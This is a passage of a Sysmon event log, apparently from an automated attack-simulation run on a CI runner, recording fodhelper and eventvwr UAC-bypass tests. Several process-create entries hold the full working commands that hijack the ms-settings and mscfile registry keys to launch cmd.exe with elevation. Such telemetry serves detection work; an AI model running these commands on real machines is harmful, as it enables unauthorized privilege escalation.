Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:17 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:17.328
ProcessGuid: {f995aebf-63c5-6942-5705-000000000e00}
ProcessId: 8624
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" 
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63c5-6942-5605-000000000e00}
ParentProcessId: 1248
ParentImage: C:\Windows\System32\fodhelper.exe
ParentCommandLine: ""C:\Windows\System32\fodhelper.exe"" 
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:17 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:03:17.156
ProcessGuid: {f995aebf-63c4-6942-5405-000000000e00}
ProcessId: 10036
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:17 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:03:17.150
ProcessGuid: {f995aebf-63c4-6942-5405-000000000e00}
ProcessId: 10036
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\DelegateExecute
Details: (Empty)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:16.755
SourceProcessGUID: {f995aebf-63b1-6942-1b05-000000000e00}
SourceProcessId: 8272
SourceThreadId: 3604
SourceImage: C:\Windows\system32\compattelrunner.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\SYSTEM32\aeinv.dll+22b55|C:\Windows\SYSTEM32\aeinv.dll+39fa3|C:\Windows\SYSTEM32\aeinv.dll+74d22|C:\Windows\SYSTEM32\aeinv.dll+48f80|C:\Windows\SYSTEM32\aeinv.dll+53228|C:\Windows\SYSTEM32\aeinv.dll+5365c|C:\Windows\system32\compattelrunner.exe+b57e|C:\Windows\system32\compattelrunner.exe+c7fb|C:\Windows\system32\compattelrunner.exe+1f5b|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:16 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:16.602
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63c4-6942-5405-000000000e00}
TargetProcessId: 10036
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:16.603
ProcessGuid: {f995aebf-63c4-6942-5405-000000000e00}
ProcessId: 10036
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\fodhelper.exe\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:16.504
ProcessGuid: {f995aebf-63c4-6942-5305-000000000e00}
ProcessId: 8996
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:16.330
ProcessGuid: {f995aebf-63c4-6942-5105-000000000e00}
ProcessId: 6204
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:16.328
ProcessGuid: {f995aebf-63c4-6942-5205-000000000e00}
ProcessId: 6308
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:16.247
ProcessGuid: {f995aebf-63c4-6942-5005-000000000e00}
ProcessId: 10164
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63c4-6942-4f05-000000000e00}
ParentProcessId: 8084
ParentImage: C:\Windows\System32\fodhelper.exe
ParentCommandLine: fodhelper.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:03:16.063
ProcessGuid: {f995aebf-63c4-6942-4e05-000000000e00}
ProcessId: 5104
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\DelegateExecute
Details: (Empty)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:03:16.049
ProcessGuid: {f995aebf-63c4-6942-4d05-000000000e00}
ProcessId: 8564
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:16.006
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63c4-6942-4b05-000000000e00}
TargetProcessId: 8784
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:16.007
ProcessGuid: {f995aebf-63c4-6942-4b05-000000000e00}
ProcessId: 8784
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f & reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f & fodhelper.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:15 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:15.931
ProcessGuid: {f995aebf-63c3-6942-4a05-000000000e00}
ProcessId: 7660
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:15 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:15.747
ProcessGuid: {f995aebf-63c3-6942-4805-000000000e00}
ProcessId: 9128
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:15 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:15.745
ProcessGuid: {f995aebf-63c3-6942-4905-000000000e00}
ProcessId: 7500
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:15.653
ProcessGuid: {f995aebf-63c3-6942-4705-000000000e00}
ProcessId: 7872
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" 
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63c3-6942-4505-000000000e00}
ParentProcessId: 1072
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {New-Item \""""HKCU:\software\classes\mscfile\shell\open\command\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\mscfile\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\eventvwr.msc\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:15 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:03:15.614
ProcessGuid: {f995aebf-63c3-6942-4505-000000000e00}
ProcessId: 1072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\mscfile\shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:15 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:15.168
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63c3-6942-4505-000000000e00}
TargetProcessId: 1072
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:15.169
ProcessGuid: {f995aebf-63c3-6942-4505-000000000e00}
ProcessId: 1072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-Item \""""HKCU:\software\classes\mscfile\shell\open\command\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\mscfile\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\eventvwr.msc\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:14 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:14.890
ProcessGuid: {f995aebf-63c2-6942-4405-000000000e00}
ProcessId: 4824
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63c2-6942-4305-000000000e00}
ParentProcessId: 2080
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe  /c eventvwr.msc
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:14 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:14.815
ProcessGuid: {f995aebf-63c2-6942-4305-000000000e00}
ProcessId: 2080
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe  /c eventvwr.msc
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63c2-6942-4005-000000000e00}
ParentProcessId: 2632
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f & cmd.exe /c eventvwr.msc
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:14 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:03:14.807
ProcessGuid: {f995aebf-63c2-6942-4205-000000000e00}
ProcessId: 1456
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\mscfile\shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:14 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:14.777
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63c2-6942-4005-000000000e00}
TargetProcessId: 2632
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:14 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:14.777
ProcessGuid: {f995aebf-63c2-6942-4005-000000000e00}
ProcessId: 2632
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f & cmd.exe /c eventvwr.msc
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
